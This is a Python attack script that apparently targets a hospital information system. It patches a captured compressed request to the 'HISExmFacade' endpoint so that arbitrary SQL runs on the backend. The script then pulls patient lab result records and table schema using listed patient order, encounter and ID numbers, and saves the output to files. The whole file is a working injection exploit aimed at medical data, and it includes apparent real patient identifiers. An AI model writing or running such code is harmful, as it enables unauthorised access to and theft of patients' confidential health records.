from his_client_final import HISClient
import requests
import zlib

class LabSearcher(HISClient):
    def execute_sql(self, sql):
        try:
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()
            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            target_len = len(original_sql_bytes)
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            padded_sql = sql.ljust(target_len)
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

searcher = LabSearcher()

# From found_record.txt:
# ORDSEQ = A75176986OR0041
# HHISTNUM = 003617083J
# ENCNTNO = 75176986
# HIDNO = C221748019

ordseq = 'A75176986OR0041'
encntno = '75176986'

print(f"1. Searching PAT_RESULTH using ORDSEQ {ordseq}...")
sql1 = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_ORDER_NO = '{ordseq}'"
res1 = searcher.execute_sql(sql1)
if res1 and "<NewDataSet>" in res1:
    print("[+] Found by ORDSEQ in PRH_ORDER_NO!")
    with open("lab_header_ordseq.txt", "w", encoding="utf-8") as f:
        f.write(res1)
    print(res1[:800])
else:
    print("[-] Not found by ORDSEQ in PRH_ORDER_NO.")

print(f"\n2. Searching PAT_RESULTH using ENCNTNO {encntno} as order no...")
sql2 = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_ORDER_NO LIKE '%{encntno}%'"
res2 = searcher.execute_sql(sql2)
if res2 and "<NewDataSet>" in res2:
    print("[+] Found by ENCNTNO in PRH_ORDER_NO!")
    with open("lab_header_encntno.txt", "w", encoding="utf-8") as f:
        f.write(res2)
    print(res2[:800])
else:
    print("[-] Not found by ENCNTNO in PRH_ORDER_NO.")

print(f"\n3. Checking all columns in PAT_RESULTH schema...")
sql3 = f"SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'PAT_RESULTH' AND OWNER = 'OPDUSR'"
res3 = searcher.execute_sql(sql3)
if res3 and "<NewDataSet>" in res3:
    print("[+] Schema:")
    print(res3[:800])
else:
    print("[-] Could not get schema.")

print(f"\n4. Searching PAT_RESULTD using ORDSEQ {ordseq}...")
sql4 = f"SELECT * FROM OPDUSR.PAT_RESULTD WHERE PRD_TRX_NUM LIKE '%{encntno}%'"
res4 = searcher.execute_sql(sql4)
if res4 and "<NewDataSet>" in res4:
    print("[+] Found in PAT_RESULTD!")
    with open("lab_detail_encntno.txt", "w", encoding="utf-8") as f:
        f.write(res4)
    print(res4[:800])
else:
    print("[-] Not found in PAT_RESULTD.")
